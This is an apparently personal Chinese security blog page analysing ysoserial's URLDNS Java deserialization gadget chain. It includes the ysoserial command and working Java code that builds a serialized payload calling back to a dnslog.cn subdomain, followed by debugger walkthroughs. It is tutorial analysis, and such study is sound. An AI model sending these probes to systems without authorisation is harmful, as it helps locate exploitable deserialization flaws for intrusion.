@@ -1,0 +1,258 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？ - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="清水Samny,"> 
+    <meta name="description" content="前言文章首发：https://www.sec-in.com/article/299&amp;emsp;&amp;emsp;2015年Gabriel Lawrence(@gebl)和Chris Frohoff(@fr,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</h1>
+        <div class="stuff">
+            <span>五月 06, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ysoserial-Gadget/" rel="tag">ysoserial-Gadget</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发：<a href="https://www.sec-in.com/article/299" target="_blank" rel="noopener">https://www.sec-in.com/article/299</a><br>&emsp;&emsp;2015年Gabriel Lawrence(@gebl)和Chris Frohoff(@frohoff)在AppSecCali大会上提出的利用Apache Commons Collections来构造命令执行利用链，随后发布ysoserial工具，从此打开Java安全的蓝海。<br>&emsp;&emsp; 利用链(gadget chains)，俗称gadget。通俗来说就是一种利用方法，它是从触发位置开始到执行命令的位置结束，也可以说是漏洞验证方法(POC)。<br>&emsp;&emsp; 使用方法，GitHub下载jar包或者git源码自己编译。</p>
+<blockquote>
+<p>java -jar ysoseial.jar URLDNS “<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a></p>
+</blockquote>
+<p>再将生成号POC发送目标，如果目标存在反序列化漏洞，并且满足利用链条件，则命令将会被执行。</p>
+<p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p>
+<hr>
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p> &emsp;&emsp; <code>URLDNS</code>是其中的一个gadget的名字，此gadget不能执行命令，通常用来验证目标是否存在反序列化漏洞。URLDNS gadget十分适合用来验证目标是否存在反序列化漏洞。</p>
+<ul>
+<li>此gadget完全使用Java内置的类构造，无需第三方库支持。</li>
+<li>如果目标没有回显，通过DNS解析请求是否存在来判断存在反序列化漏洞。</li>
+</ul>
+<hr>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开<code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</code>查看源码，但笔者这里使用自己改写的源码来分析此gadget链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> samny.serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> samny.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="keyword">null</span>,<span class="string">"http://4h9yq1.dnslog.cn"</span>,handler);</span><br><span class="line">        hm.put(url,url);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(url,<span class="string">"hashCode"</span>,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"url"</span>));</span><br><span class="line">        oos.writeObject(hm);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"url"</span>));</span><br><span class="line">		<span class="comment">// 注释这行代码是不会产生dns解析请求，</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 漏洞分析之前，我们先看看漏洞执行效果。<br>&emsp;&emsp; 分析一个在线dns解析记录网站<a href="http://www.dnslog.cn" target="_blank" rel="noopener">DNSlog Platform</a>，网站无需任何登录注册，国内访问速度也快，DNS记录获取速度没得说，子域名可以无限更换。<br><img src="https://img-blog.csdnimg.cn/20200427153912402.png" alt="在这里插入图片描述"><br><strong>漏洞复现步骤</strong></p>
+<ol>
+<li>修改你能过记录dns解析的网址。<br><img src="https://img-blog.csdnimg.cn/20200427154428787.png" alt="在这里插入图片描述"></li>
+<li>直接运行main方法，刷新记录。</li>
+</ol>
+<h2 id="断点分析"><a href="#断点分析" class="headerlink" title="断点分析"></a>断点分析</h2><p>&emsp;&emsp; 触发反序列化漏洞的方法是<code>readObject</code>，所以笔者在43行代码处和<code>hashmap</code>的<code>readObject</code>各设置一个断点。<br>PS:</p>
+<ul>
+<li>以免dns记录混淆，建议每次分析都换一个域名。</li>
+<li>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</li>
+<li>其实搜索是可以搜索导入包的内容的，<code>Ctrl+Shift+F</code> 在<code>Scope - All Places</code>搜索<code>class hashmap</code>即可。<br><img src="https://img-blog.csdnimg.cn/20200427155537417.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 断点设置好了，开始分析，笔者这里直接从HashMap.java的<code>readObject</code>开始分析。<br>hashmap中readObject会调用putVal方法是往HashMap中放入键值对的方法，进而会计算hashcode值。<br><img src="https://img-blog.csdnimg.cn/20200427155709722.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接着会判断key是否为空，hashCode是否不等于-1，不等于-1会直接返回，等于-1会重新计算。这时候我们看笔者写源码36行，修改方法hashCode的值为-1，这时你是否明白此时的用意。<br><img src="https://img-blog.csdnimg.cn/20200427160955616.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161035866.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427161223686.png" alt="在这里插入图片描述"></li>
+</ul>
+<p>&emsp;&emsp; 计算<code>hash</code>的时候会跳转到<code>java.net.URLStreamHandler.java#hashCode</code>方法来计算hash。注意看图片中被框住的一行代码，hashCode在计算hash时，会调用<code>getHostAddress()</code>方法，进而调用<code>getByName(host)</code>方法。<br><img src="https://img-blog.csdnimg.cn/20200427161513369.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 执行方法，我们发现会有一个等待时间大概2秒钟之后(其实就是DNS解析所需要的时间)，可以获取DNS解析记录。<br><img src="https://img-blog.csdnimg.cn/20200427162302103.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200427162013698.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020042716232791.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427162708718.png" alt="在这里插入图片描述"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 整个的<code>URLDNS</code>的gadget其实清晰又简单。</p>
+<ol>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ol>
+<p>&emsp;&emsp; 其实作者在博客中写道，可以用四行代码就可以实现此gadget chains，反观ysoserial中源码，去掉注释也多还有几行代码，<code>多出的代码时干嘛的呢？</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200427164430117.png" alt="在这里插入图片描述"></p>
+<h2 id="巧妙避免重复"><a href="#巧妙避免重复" class="headerlink" title="巧妙避免重复"></a>巧妙避免重复</h2><p>&emsp;&emsp; 多出几行代码，我们来分析一下。ysoserial的作者重写了URLStreamHandler其中两个方法。但是我们还没搞清楚其中的作用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp; 老规矩，断点撸码。不过此时断点应该设置在哪？笔者按照源作者的代码，去掉序列化和反序列化的过程。剩下代码也就上面的和下面图片给出的5行代码，分析不难发现断点应该设置在<code>hm.put()</code>。其中31和32行代码肯定是不会去设置断点的，至于36行在之前就说明其作用。<br><img src="https://img-blog.csdnimg.cn/20200427171425793.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 调试代码不能发现，put方法也和hashmap中的readObject方法的方法是差不多的，继续跟进。<br><img src="https://img-blog.csdnimg.cn/20200427171917233.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 继续跟进还是来到<code>java.net.URLStreamHandler#hashCode</code>方法，但此时方法会跳转到笔者复写的方法中，返回应该<code>null</code>，进而就不会去解析dns。<br><img src="https://img-blog.csdnimg.cn/20200427172155144.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427172348537.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>&emsp;&emsp; 为什么hashmap中putval方法就不会跳转到我们复现的类方法里面返回一个null呢？（个人见解，源码无法修改所以无法调试）<br>答：反序列化时应该时将二进制代码直接读取，进去调用hashmap中readObject方法，此时反序列化完全是使用jdk源码调用，不会再去看我们用户复写方法。<br>&emsp;&emsp; 笔者这里有点事实可以整明我的观点。<br>众所周知Java是代码是一行一行的去编译解释的，我们复现的类URLStreamHandler，实现的类对象hander在url进实例化的时候处理了，也就是33行代码。但是进行反序列化操作的时候，并没有将此复现方法进行序列化，所以反序列化的时候不会处理URL，计算hash值的时候，不可能跳转到我们复写的方法返回一个null，只能是跳转到原本的方法中。<br><img src="https://img-blog.csdnimg.cn/20200427174533677.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 当URL最初被放在HashMap中时，通过可以调用put，HashMap.hashMap.hash方法被调用。这个方法反过来又会调用该URL的hashCode，但是hashCode是有一个缓存值的，并不会触发DNS解析。但是我们可以在读取数据流的时候，在URL添加到HashMap中重置缓存值(使其hashCode=-1)，来确保DNS解析。可以使用Java的Reflection中setFieldValue方法来达到重置hashCode值为-1。<br>&emsp;&emsp; Ysoserial用一个类复写完美避免重复DNSLOG，感概其作者的神奇逻辑思维能力。有兴趣的朋友完全可以去注释掉<code>getHostAddress</code>方法亦或者是删除掉整个handler代码，然后就会出现DNSLOG。</p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神Java安全漫谈 - 08.反序列化篇(2)<br><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank" rel="noopener">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a><br><a href="https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/" target="_blank" rel="noopener">https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='19e2c5d71620cb7b14d99a908f8134be70bd83fa'
+        data-r='gittalksamny'
+        data-o='samny520'
+        data-a='samny520'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS"><span class="toc-number">2.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#断点分析"><span class="toc-number">2.3.</span> <span class="toc-text">断点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">2.4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#巧妙避免重复"><span class="toc-number">2.5.</span> <span class="toc-text">巧妙避免重复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+<script src="/js/baidu.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
